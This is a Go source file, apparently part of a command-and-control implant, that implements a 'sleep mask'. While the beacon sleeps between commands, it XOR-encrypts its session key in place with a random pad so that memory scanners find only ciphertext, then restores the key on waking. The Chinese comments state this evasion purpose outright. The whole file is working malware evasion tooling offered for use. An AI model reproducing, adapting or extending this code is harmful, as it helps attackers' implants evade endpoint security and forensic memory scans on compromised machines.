package sleepmask

import (
	"crypto/rand"
	"time"
)

// SleepWithMask 在睡眠期间用随机 pad 对 key 做就地 XOR 加密，醒后 XOR 还原。
//
// B9 Sleep Mask 的 Go implant 实用版。说明：Go runtime 无法像 C beacon 那样加密自身 .text
// 段（会 crash），因此只保护最高价值的内存——会话密钥。睡眠期（beacon 空闲，无命令收发）
// 将会话密钥就地 XOR 加密，扫描器在此时抓取内存只能拿到密文，醒后还原继续解密命令。
//
// 约束：调用期间不得有其它 goroutine 访问 key（仅在 beacon 空闲睡眠期调用）。
func SleepWithMask(d time.Duration, key []byte) {
	if len(key) == 0 || d <= 0 {
		time.Sleep(d)
		return
	}
	pad := make([]byte, len(key))
	if _, err := rand.Read(pad); err != nil {
		time.Sleep(d) // 取随机失败则不加密，仅睡眠（不破坏密钥）
		return
	}
	xor(key, pad) // 加密
	time.Sleep(d)
	xor(key, pad) // 还原
}

func xor(a, b []byte) {
	for i := range a {
		a[i] ^= b[i]
	}
}
